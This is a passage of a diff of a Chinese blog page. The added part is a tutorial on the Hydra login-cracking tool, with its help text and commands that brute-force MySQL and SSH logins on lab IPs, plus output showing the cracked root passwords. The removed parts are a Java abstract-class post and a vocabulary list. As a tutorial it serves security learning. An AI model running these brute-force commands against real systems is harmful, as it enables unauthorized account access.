TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line">语法：hydra ...</span><br><span class="line">hydra [ [-l LOGIN|-L FILE] [-p PASS|-P FILE] ]</span><br><span class="line">hydra [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">选项：</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -l 登录名 或者 -L 文件  登录使用一个登录名，或者从文件中加载多个登录</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -p 密码 或者 -P 文件	尝试密码登录，或者从文件中加载多个密码</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -C 文件		冒号分隔格式 &quot;login:pass&quot;，而不是 -L/-P 选项</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &#x27;:&#x27; to specify port</span><br><span class="line">  -M 文件		要攻击的服务器列表，每行一个条目，使用&#x27;:&#x27;去指定端口</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -t 线程数	运行任务在每一个目标的并行连接数（默认值：16）</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -U		服务模块使用详情</span><br><span class="line">  -m OPT    options specific for a module, see -U output for information</span><br><span class="line">  -m 选项		特定于模块的选项，使用 -U 查看输出详细信息</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  -h		更多命令行选项（完整帮助）</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  服务器		目标DNS，IP 或者 网关 192.168.0.0/24（此选项或者 -M 选项）</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  服务		要破解的服务（有关支持的协议，请参见下文）</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line">  选项		一些支持附加输入的服务模块（-U 表示模块帮助）</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br><span class="line">支持的服务：...</span><br><span class="line"></span><br><span class="line">Hydra is a tool to guess/crack valid login/password pairs.</span><br><span class="line">Hydra 是一个 猜测/破解 有效 登录/密码对 的工具。</span><br><span class="line">Licensed under AGPL v3.0. The newest version is always available at;</span><br><span class="line">根据AGPL v3.0许可，最新版本可以从以下网址获取：</span><br><span class="line">https://github.com/vanhauser-thc/thc-hydra</span><br><span class="line">Please don&#x27;t use in military or secret service organizations, or for illegal</span><br><span class="line">purposes. (This is a wish and non-binding - most such people do not care about</span><br><span class="line">laws and ethics anyway - and tell themselves they are one of the good ones.)</span><br><span class="line">请不要使用在军事或者密码服务组织中使用，否则为非法目的。（这是一个愿望，没有约束力，大多数这样的人不关心法律和道德，告诉自己他们是好的。）</span><br><span class="line"></span><br><span class="line">Example:  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">示例：hydar ...</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-破解MySQL"><a href="#2-2-破解MySQL" class="headerlink" title="2.2 破解MySQL"></a>2.2 破解MySQL</h2><h3 id="（1）指定-IP-端口破解"><a href="#（1）指定-IP-端口破解" class="headerlink" title="（1）指定 IP 端口破解"></a>（1）指定 IP 端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录账户薄 -P 密码薄 mysql://目标IP:mysql端口号</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt mysql://192.168.1.106:3306</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:23:55</span><br><span class="line">Hydra 开始于 2022-11-26 14:23:55</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">信息：将任务数量减少到4（mysql不喜欢多并行连接）</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">数据：每台服务器最多4个任务，总共4个任务，15次登录尝试（l:3/p:5）,每个任务约4次尝试</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">数据：攻击 mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">1个目标中1个成功完成，找到一个有效密码。</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:23:56</span><br><span class="line">Hydra 完成于 2022-11-26 14:23:56</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）默认端口破解"><a href="#（2）默认端口破解" class="headerlink" title="（2）默认端口破解"></a>（2）默认端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果服务使用的是默认端口，那么指令也可以这样写</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L ./login.txt -P ./passwd.txt 目标IP mysql</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt 192.168.1.106 mysql       </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:55:38</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:55:38</span><br></pre></td></tr></table></figure>
+
+<h3 id="（3）展示爆破过程"><a href="#（3）展示爆破过程" class="headerlink" title="（3）展示爆破过程"></a>（3）展示爆破过程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示爆破过程，添加指令 -V</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -V  mysql://192.168.1.106:3306 </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 15:00:51</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;123456&quot; - 1 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;abcdefg&quot; - 2 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;admin&quot; - 3 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;root&quot; - 4 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;987654&quot; - 5 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;123456&quot; - 6 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;abcdefg&quot; - 7 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;admin&quot; - 8 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;root&quot; - 9 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;987654&quot; - 10 of 15 [child 1] (0/0)</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;123456&quot; - 11 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;abcdefg&quot; - 12 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;admin&quot; - 13 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;root&quot; - 14 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;987654&quot; - 15 of 15 [child 3] (0/0)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 15:00:51</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-ssh-破解"><a href="#2-3-ssh-破解" class="headerlink" title="2.3 ssh 破解"></a>2.3 ssh 破解</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录薄 -P 密码薄 -t 线程数 ssh://目标ip</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -t 4 ssh://192.168.80.129</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 16:02:31</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.80.129:22/</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: ghost   password: root</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 16:02:50</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -699,549 +1235,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/20/java%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%8F%AF%E4%BB%A5%E8%A2%AB%E7%BB%A7%E6%89%BF%E5%90%97%EF%BC%9F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/20/java%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%8F%AF%E4%BB%A5%E8%A2%AB%E7%BB%A7%E6%89%BF%E5%90%97%EF%BC%9F/" class="post-title-link" itemprop="url">Java抽象类</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-20 21:36:29 / 修改时间：22:27:40" itemprop="dateCreated datePublished" datetime="2022-11-20T21:36:29+08:00">2022-11-20</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">Java理论基础</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Java-抽象类"><a href="#Java-抽象类" class="headerlink" title="Java 抽象类"></a>Java 抽象类</h1><h2 id="一：什么是抽象类？"><a href="#一：什么是抽象类？" class="headerlink" title="一：什么是抽象类？"></a>一：什么是抽象类？</h2><p style="text-indent:2em;">在面向对象的概念中在，所有的对象都是通过类来描绘的，但反过来讲，并不是所有的类都是用来描绘对象的。如果一个类中没有包含足够的信息来描绘一个具体的对象，这个类就是抽象类。父类包含了之类集合的常用方法，但是由于父类本身是抽象的，所以不能使用这些方法。</p>
-
-<p style="text-indent:2em;">抽象类是指不允许被实例化的类；抽象方法是没有方法体的方法。</p>
-
-<ol>
-<li>抽象类可以不包括抽象方法，反正它不会被实例化，里面的方法是不是抽象的本质上没有任何影响。</li>
-<li>但是含有抽象方法的类绝不能被实例化，否则执行这个方法的时候，应该怎么办！</li>
-<li>如果子类是非抽象的，那么它就必须实现父类中的抽象方法；否则，它继承来的抽象方法仍然没有方法体，也是个抽象方法，因此之类必须实现父类的抽象方法。</li>
-</ol>
-<h2 id="二：抽象类可以被继承吗？"><a href="#二：抽象类可以被继承吗？" class="headerlink" title="二：抽象类可以被继承吗？"></a>二：抽象类可以被继承吗？</h2><ol>
-<li>抽象类可以被继承。</li>
-<li>抽象类除了不能被实例化对象之外，类的其他功能依然存在，成员变量、成员方法及构造方法的访问方式和普通的类一样。</li>
-<li>由于抽象类不能被实例化对象，所以抽象类必须被继承才能使用。也正因如此，在设计阶段决定要不要设计抽象类。</li>
-</ol>
-<h2 id="三：知识汇总"><a href="#三：知识汇总" class="headerlink" title="三：知识汇总"></a>三：知识汇总</h2><ol>
-<li>abstract 是一个修饰符；</li>
-<li>使用 abstract 修饰的类是抽象类；</li>
-<li>使用 abstract 修饰的方法是抽象方法，抽象方法没有方法体；只能进行功能定义，没有功能实现，功能实现由之类完成；</li>
-<li>实现抽象方法，就是给抽象方法加上方法体，去掉 abstract 修饰；</li>
-<li>抽象类的目的：该类不能被实例化对象，只能被继承；</li>
-<li>抽象方法一定在抽象类中成立；</li>
-<li>抽象类中不一定由抽象方法，比如不想让某个类有对象，可以创建为抽象类；</li>
-<li>final 修饰的类不能被继承；</li>
-<li>final 修饰的成员方法不能被覆写；</li>
-<li>抽象类就是用于被继承的；</li>
-<li>抽象方法就是用于被覆写的；</li>
-<li>因而 final 和 abstract 不能同时出现；</li>
-<li>一个类若想继承一个抽象类，必须实现该抽象类的所有抽象方法；</li>
-<li>一个抽象类如果想要继承一个抽象类，可以实现0~N个抽象方法；</li>
-<li>虽然抽象类不能被创建对象，但是抽象类有构造方法，因为之类创建对象需要调用父类然后调用 Object 实现；</li>
-<li>abstract 是不能修饰静态方法的，因为静态方法不能被覆写；</li>
-<li>抽象方法与成员方法一样，仅仅是没有方法体而已；</li>
-<li>抽象方法必须被覆写，成员方法根据需求覆写；</li>
-</ol>
-<h2 id="四：抽象类应用场景"><a href="#四：抽象类应用场景" class="headerlink" title="四：抽象类应用场景"></a>四：抽象类应用场景</h2><ul>
-<li><p>例如我们在定义父类的时候，仅仅知道父类的功能，不知道如何实现时；</p>
-</li>
-<li><p>举例：动物会运动；但是运动的方式不一样，有天上飞的、地下跑的、水里游的…</p>
-</li>
-<li><p>这是，我们就能定义为抽象类说明功能，具体的实现由实现类去完成；</p>
-</li>
-</ul>
-<h2 id="五：代码示例"><a href="#五：代码示例" class="headerlink" title="五：代码示例"></a>五：代码示例</h2><h3 id="（1）父类"><a href="#（1）父类" class="headerlink" title="（1）父类"></a>（1）父类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="（2）子类"><a href="#（2）子类" class="headerlink" title="（2）子类"></a>（2）子类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;猫在地上跑~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;喵喵叫~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;鱼在水中游...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GoldFish</span> <span class="keyword">extends</span> <span class="title class_">Fish</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;金鱼咕咕叫~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="（3）测试"><a href="#（3）测试" class="headerlink" title="（3）测试"></a>（3）测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">GoldFish</span> <span class="variable">goldFish</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GoldFish</span>();</span><br><span class="line">        goldFish.call();</span><br><span class="line">        goldFish.run();</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">        cat.call();</span><br><span class="line">        cat.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">金鱼咕咕叫~</span><br><span class="line">鱼在水中游...</span><br><span class="line">喵喵叫~</span><br><span class="line">猫在地上跑~</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/20/%E4%B8%93%E4%B8%9A%E8%AF%8D%E6%B1%87%E7%A7%AF%E7%B4%AF009/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/20/%E4%B8%93%E4%B8%9A%E8%AF%8D%E6%B1%87%E7%A7%AF%E7%B4%AF009/" class="post-title-link" itemprop="url">专业词汇积累009</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-20 21:02:31 / 修改时间：21:32:59" itemprop="dateCreated datePublished" datetime="2022-11-20T21:02:31+08:00">2022-11-20</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%8D%E6%B1%87/" itemprop="url" rel="index"><span itemprop="name">专业词汇</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Professional-Vocabulary-Accumulation-009"><a href="#Professional-Vocabulary-Accumulation-009" class="headerlink" title="Professional Vocabulary Accumulation_009"></a>Professional Vocabulary Accumulation_009</h1><ul>
-<li>The method allows to retrieve items according to the given parameters.</li>
-<li>此方法允许根据给定的参数获取监控项。</li>
-<li>inlay hints</li>
-<li>内置的提醒</li>
-<li>Contains</li>
-<li>包括</li>
-<li>use a like with ‘%’ wildcard added to the beginning and end.</li>
-<li>使用在开头和结尾添加一个 ‘%’ 的通配符</li>
-<li>the equal to bind value.</li>
-<li>等于绑定值</li>
-<li>the root query bean instance.</li>
-<li>根查询Bean实例</li>
-<li>navigate to previous declared variable ‘ids’</li>
-<li>导航到之前声明的变量 ‘ids’</li>
-<li>shows project statistic</li>
-<li>显示项目统计信息</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/20/EasyExcel-Manual/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/20/EasyExcel-Manual/" class="post-title-link" itemprop="url">EasyExcel Manual</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-20 18:15:25 / 修改时间：18:32:35" itemprop="dateCreated datePublished" datetime="2022-11-20T18:15:25+08:00">2022-11-20</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Java编程</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
